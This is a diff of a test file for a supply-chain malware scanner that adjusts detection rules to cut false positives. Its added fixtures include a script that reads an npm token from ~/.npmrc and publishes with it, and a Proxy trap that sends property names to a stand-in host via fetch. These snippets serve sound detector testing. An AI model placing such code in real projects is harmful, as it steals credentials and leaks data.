@@ -16,7 +16,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
 
   // ── README_LURE rules only fire in markdown/README files ──────────
 
-  describe("README_LURE rules — onlyFilePattern", () => {
+  describe("README_LURE rules - onlyFilePattern", () => {
     it("should NOT fire README_LURE_CRACK on .ts source files containing 'nolimit'", async () => {
       fs.writeFileSync(
         path.join(tempDir, "rate-limiter.ts"),
@@ -65,7 +65,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
 
   // ── SHAI_HULUD rules skip YAML workflow files ─────────────────────
 
-  describe("SHAI_HULUD rules — notFilePattern (.yml)", () => {
+  describe("SHAI_HULUD rules - notFilePattern (.yml)", () => {
     it("should NOT fire SHAI_HULUD_WORM on .yml file containing 'npm publish'", async () => {
       fs.mkdirSync(path.join(tempDir, ".github", "workflows"), { recursive: true });
       fs.writeFileSync(
@@ -86,13 +86,29 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
       expect(report.findings.find((f) => f.rule === "SHAI_HULUD_CRED_STEAL")).toBeUndefined();
     });
 
-    it("should FIRE SHAI_HULUD_WORM on .js file running npm publish via execSync", async () => {
+    it("should FIRE SHAI_HULUD_WORM when npm publish follows a credential read", async () => {
+      // The worm signature is publishing with credentials it just harvested.
       fs.writeFileSync(
         path.join(tempDir, "infect.js"),
-        `const { execSync } = require("child_process");\nexecSync("npm publish --access public");`,
+        `const { execSync } = require("child_process");\n` +
+          `const fs = require("fs");\n` +
+          `const token = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");\n` +
+          `execSync("npm publish --//registry.npmjs.org/:_authToken=" + token);`,
       );
       const report = await scan({ target: tempDir, format: "text" });
       expect(report.findings.find((f) => f.rule === "SHAI_HULUD_WORM")).toBeDefined();
+    });
+
+    it("should NOT fire SHAI_HULUD_WORM on an ordinary release script", async () => {
+      // `execSync("npm publish")` with no credential handling is what every
+      // library's release script does. This used to be a CRITICAL verdict, which
+      // made every repo with a release script critical on sight.
+      fs.writeFileSync(
+        path.join(tempDir, "release.js"),
+        `const { execSync } = require("child_process");\nexecSync("npm publish --access public");`,
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.find((f) => f.rule === "SHAI_HULUD_WORM")).toBeUndefined();
     });
 
     it("should FIRE SHAI_HULUD_CRED_STEAL on .js reading NPM_TOKEN", async () => {
@@ -107,7 +123,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
 
   // ── Minified files do not trigger context-unaware patterns ────────
 
-  describe("Minified file exclusion — notFilePattern (.min.js)", () => {
+  describe("Minified file exclusion - notFilePattern (.min.js)", () => {
     it("should NOT fire PROXY_HANDLER_TRAP on .min.js files", async () => {
       fs.writeFileSync(
         path.join(tempDir, "htmx.min.js"),
@@ -117,13 +133,25 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
       expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeUndefined();
     });
 
-    it("should FIRE PROXY_HANDLER_TRAP in non-minified .js files", async () => {
+    it("should FIRE PROXY_HANDLER_TRAP when the trap body exfiltrates", async () => {
       fs.writeFileSync(
         path.join(tempDir, "intercept.js"),
-        `const handler = new Proxy(target, { get: function(obj, prop) { steal(prop); return obj[prop]; } });`,
+        `const handler = new Proxy(target, { get: function(obj, prop) { fetch("https://x.invalid/?k=" + prop); return obj[prop]; } });`,
       );
       const report = await scan({ target: tempDir, format: "text" });
       expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeDefined();
+    });
+
+    it("should NOT fire PROXY_HANDLER_TRAP on a plain ES6 Proxy", async () => {
+      // `new Proxy(obj, { get, set })` is a language feature, used by prisma,
+      // vitest, jiti and playwright-core. Matching its definition made all of
+      // them a high-severity finding.
+      fs.writeFileSync(
+        path.join(tempDir, "store.js"),
+        `const store = {};\nconst p = new Proxy(store, { get: (t, k) => t[k], set: (t, k, v) => { t[k] = v; return true; } });\nmodule.exports = p;`,
+      );
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(report.findings.find((f) => f.rule === "PROXY_HANDLER_TRAP")).toBeUndefined();
     });
 
     it("should NOT fire BEACON_INTERVAL_FETCH on .min.js files", async () => {
@@ -139,7 +167,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
 
   // ── JSON files do not trigger miner config keys ───────────────────
 
-  describe("JSON file exclusion — MINER_CONFIG_KEYS", () => {
+  describe("JSON file exclusion - MINER_CONFIG_KEYS", () => {
     it("should NOT fire MINER_CONFIG_KEYS on bootstrap-icons.json with 'coin' icon names", async () => {
       fs.writeFileSync(
         path.join(tempDir, "bootstrap-icons.json"),
@@ -161,7 +189,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
 
   // ── IAC_HARDCODED_SECRET skips test files and dummy values ────────
 
-  describe("IAC_HARDCODED_SECRET — notTestFile + pattern tightening", () => {
+  describe("IAC_HARDCODED_SECRET - notTestFile + pattern tightening", () => {
     it("should NOT fire IAC_HARDCODED_SECRET on conftest.py with dummy api_key", async () => {
       fs.writeFileSync(
         path.join(tempDir, "conftest.py"),
@@ -183,7 +211,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
 
   // ── VIDAR_BROWSER_THEFT requires OS-specific browser paths ────────
 
-  describe("VIDAR_BROWSER_THEFT — pattern precision", () => {
+  describe("VIDAR_BROWSER_THEFT - pattern precision", () => {
     it("should NOT fire VIDAR_BROWSER_THEFT on 'History' word in Prisma schema", async () => {
       fs.writeFileSync(
         path.join(tempDir, "schema.prisma"),
@@ -239,7 +267,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
       );
       const report = await scan({ target: tempDir, format: "text" });
       const hasMeta = report.findings.find((f) => f.rule === "CRITICAL_FINDING_NO_OWNER");
-      // Score must not be inflated by meta-finding — CRITICAL_FINDING_NO_OWNER fires
+      // Score must not be inflated by meta-finding - CRITICAL_FINDING_NO_OWNER fires
       // because MINER_STRATUM_PROTOCOL is critical, but should NOT add to the score itself.
       // Real findings: MINER_STRATUM_PROTOCOL (critical=25). Meta adds 0.
       if (hasMeta) {
@@ -252,7 +280,7 @@ describe("Context-Aware False Positive Elimination (v5.0.0)", () => {
 
   // ── PROXY_BACKCONNECT requires SOCKS5/protocol indicators ─────────
 
-  describe("PROXY_BACKCONNECT — pattern precision", () => {
+  describe("PROXY_BACKCONNECT - pattern precision", () => {
     it("should NOT fire PROXY_BACKCONNECT on array .reverse() method", async () => {
       fs.writeFileSync(
         path.join(tempDir, "utils.ts"),
